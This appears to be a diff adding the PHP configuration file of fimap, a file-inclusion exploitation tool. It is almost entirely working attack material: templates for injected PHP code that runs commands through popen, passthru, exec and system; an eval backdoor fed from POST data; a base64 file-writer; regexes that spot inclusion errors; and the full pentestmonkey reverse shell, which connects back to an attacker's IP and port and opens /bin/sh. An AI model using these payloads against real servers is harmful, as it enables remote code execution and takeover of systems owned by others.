@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<fimap language="php" revision="3" force_inclusion_test="0" autor="Iman Karim (ikarim2s@smail.inf.fh-brs.de)" >
+	<snipe regex="Failed opening( required)* '(?P&lt;incname&gt;[\d\w/\.\-:\\]*?%s[\d\w/\.\-\\]*?)' (for inclusion)*" />
+	
+	<relative_files>
+	</relative_files>
+	
+	<absolute_files>
+		<file path="php://input" post="__QUIZ__" find="__ANSWER__" flags="rxP"  unix="1" windows="1"/>
+	</absolute_files>
+	
+	<remote_files>
+		<file path="http://www.phpbb.de/index.php" find="Willkommen auf phpBB.de" flags="rR"  unix="1" windows="1"/>
+	</remote_files>
+	
+	<log_files>
+	</log_files>
+	
+	<exec_methods>
+		<exec unix="1" win="0" dobase64="1" name="popen[b64]"    source='&lt;?php $h=popen(base64_decode("__PAYLOAD__") . " 2&gt;&amp;1", "r");while(!feof($h)){$l=fread($h, 2024);echo $l;}?&gt;' />
+		<exec unix="1" win="0" dobase64="1" name="passthru[b64]" source='&lt;?php passthru (base64_decode("__PAYLOAD__"). " 2&gt;&amp;1"); ?&gt;' />
+		<exec unix="1" win="0" dobase64="1" name="exec[b64]"     source='&lt;?php exec(base64_decode("__PAYLOAD__"). " 2&gt;&amp;1", $arr); $data = join("\n",$arr); echo $data; ?&gt;' />
+		<exec unix="1" win="0" dobase64="1" name="popen[b64]"    source='&lt;?php system (base64_decode("__PAYLOAD__"). " 2&gt;&amp;1"); ?&gt;' />
+		<exec unix="1" win="0" dobase64="0" name="popen"    	 source='&lt;?php $h=popen("__PAYLOAD__" . " 2&gt;&amp;1", "r");while(!feof($h)){$l=fread($h, 2024);echo $l;}?&gt;' />
+		<exec unix="1" win="0" dobase64="0" name="passthru" 	 source='&lt;?php passthru ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
+		<exec unix="1" win="0" dobase64="0" name="exec"     	 source='&lt;?php exec("__PAYLOAD__". " 2&gt;&amp;1", $arr); $data = join("\n", $arr); echo $data; ?&gt;' />
+		<exec unix="1" win="0" dobase64="0" name="system"    	 source='&lt;?php system ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
+		
+		<exec unix="0" win="1" dobase64="1" name="popen[b64][win]"    source='&lt;?php $h=popen(base64_decode("__PAYLOAD__") , "r");while(!feof($h)){$l=fread($h, 2024);echo $l;}?&gt;' />
+		<exec unix="0" win="1" dobase64="1" name="passthru[b64][win]" source='&lt;?php passthru (base64_decode("__PAYLOAD__")); ?&gt;' />
+		<exec unix="0" win="1" dobase64="1" name="exec[b64][win]"     source='&lt;?php exec(base64_decode("__PAYLOAD__"), $arr); $data = join("\n",$arr); echo $data; ?&gt;' />
+		<exec unix="0" win="1" dobase64="1" name="popen[b64][win]"    source='&lt;?php system (base64_decode("__PAYLOAD__")); ?&gt;' />
+		<exec unix="0" win="1" dobase64="0" name="popen[win]"         source='&lt;?php $h=popen("__PAYLOAD__" , "r");while(!feof($h)){$l=fread($h, 2024);echo $l;}?&gt;' />
+		<exec unix="0" win="1" dobase64="0" name="passthru[win]"      source='&lt;?php passthru ("__PAYLOAD__"); ?&gt;' />
+		<exec unix="0" win="1" dobase64="0" name="exec[win]"          source='&lt;?php exec ("__PAYLOAD__", $arr); $data = join("\n",$arr); echo $data; ?&gt;' />
+		<exec unix="0" win="1" dobase64="0" name="system[win]"        source='&lt;?php system ("__PAYLOAD__"); ?&gt;' />
+	</exec_methods> 
+	
+	<payloads>
+		<payload name="Spawn pentestmonkey's reverse shell" dobase64="0" inshell="0" unix="1" win="0">
+			<input type="question" text="IP Address to connect back to: " placeholder="__IP__" />
+			<input type="question" text="The Port it should connect back: " placeholder="__PORT__" />
+			<input type="wait"     text="Make your netcat server ready and hit enter..." />
+			<code source='&lt;?php set_time_limit (0);$VERSION = "1.0";$ip = "__IP__";$port = __PORT__;$chunk_size = 1400;$write_a = null;$error_a = null;$shell = "uname -a; w; id; /bin/sh -i";$daemon = 0;$debug = 0;if (function_exists("pcntl_fork")) { $pid = pcntl_fork();if ($pid == -1) { printit("ERROR: Cant fork");exit(1);} if ($pid) { exit(0);} if (posix_setsid() == -1) { printit("Error: Cant setsid()");exit(1);} $daemon = 1;} else {printit("WARNING: Failed to daemonise.This is quite common and not fatal.");}chdir("/");umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) { printit("$errstr ($errno)");exit(1);}$descriptorspec = array( 0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) {printit("ERROR: Cant spawn shell"); exit(1);}stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit("Successfully opened reverse shell to $ip:$port");while (1) {if (feof($sock)) {printit("ERROR: Shell connection terminated");break;} if (feof($pipes[1])) {printit("ERROR: Shell process terminated"); break;} $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);if (in_array($sock, $read_a)) { if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input");fwrite($pipes[0], $input);} if (in_array($pipes[1], $read_a)) { if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input");fwrite($sock, $input);} if (in_array($pipes[2], $read_a)) { if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input");fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit ($string) { if (!$daemon) { print "$string\n";}}?&gt;' />
+		</payload>
+	</payloads>
+	
+	<methods>
+		<quiz 				isbase64="1" 	source="cm5kID0gc2VsZi5nZXRSYW5kb21TdHIoKQpwaHBjb2RlID0gImVjaG8gIgpmb3IgYyBpbiBybmQ6CiAgICBwaHBjb2RlICs9ICJjaHIoJWQpLiIlKG9yZChjKSkKcGhwY29kZSA9ICI8P3BocCAlczsgPz4iICUocGhwY29kZVs6LTFdKQpyZXQgPSAocGhwY29kZSwgcm5kKQo=" />
+		<print 				isbase64="0" 	source="&lt;?php echo '__PLACEHOLDER__'; ?&gt;" />
+		<eval_kickstarter 	isbase64="0" 	source="&lt;?php eval(base64_decode($_POST['data'])); ?&gt;" />
+		<write_file         isbase64="1"    source="PD9waHAgJG15RmlsZSA9ICJfX0ZJTEVfXyI7CiRmaCA9IGZvcGVuKCRteUZpbGUsICdfX01PREVfXycpIG9yIGRpZSgiRkFJTEVEIik7CiRkID0gYmFzZTY0X2RlY29kZSgiX19CNjRfREFUQV9fIik7CmZ3cml0ZSgkZmgsICRkKTsKZmNsb3NlKCRmaCk7ID8+" />
+	</methods>
+	
+	<detectors>
+		<include_patterns>
+			<pattern regex="\(include_path='.*?'\) in &lt;b&gt;(?P&lt;script&gt;.*?)&lt;/b&gt;* on line" />
+			<pattern regex="failed to open stream: No such file or directory \((?P&lt;script&gt;.*?)- Line" />
+			<pattern regex="An error occurred in script '(?P&lt;script&gt;.*?)' on line \d?." />
+			<pattern regex="Failed opening '.*?' for inclusion in &lt;b&gt; (?P&lt;script&gt;.*?)&lt;/b&gt; on line" />
+			<pattern regex="Failed opening '.*?' for inclusion .*? in (&lt;b&gt; )?(?P&lt;script&gt;.*?) (&lt;b&gt; )?on line" />
+			<pattern regex="Failed opening required '.*?' .*? in (?P&lt;script&gt;.*?) on" />
+			<pattern regex="failed to open stream:.*?@(?P&lt;script&gt;.*?):" />
+			<pattern regex="in file &lt;b&gt;(?P&lt;script&gt;.*?)&lt;/b&gt;" />
+			<pattern regex="failed to open stream: No such file or directory in (?P&lt;script&gt;.*?) on line" />
+			<pattern regex="failed to open stream: No such file or directory in &lt;b&gt;(?P&lt;script&gt;.*?)&lt;/b&gt; on line" />
+			<pattern regex="Failed opening .*? for inclusion .*?on (?P&lt;script&gt;.*?) " />
+		</include_patterns>
+		
+		<readfile_patterns>
+			<pattern regex="&lt;b&gt;Warning&lt;/b&gt;:  file(.*?%s.*?)*" />
+			<pattern regex="&lt;b&gt;Warning&lt;/b&gt;:  read_file(.*?%s.*?)*" />
+			<pattern regex="&lt;b&gt;Warning&lt;/b&gt;:  highlight_file(.*?%s.*?)*" />
+			<pattern regex="&lt;b&gt;Warning&lt;/b&gt;:  show_source(.*?%s.*?)*" />
+		</readfile_patterns>
+		
+		<extentions>
+			<extention ext=".php" />
+			<extention ext=".php3" />
+			<extention ext=".php4" />
+			<extention ext=".php5" />
+			<extention ext=".phtml" />
+		</extentions>
+	</detectors>
+</fimap>
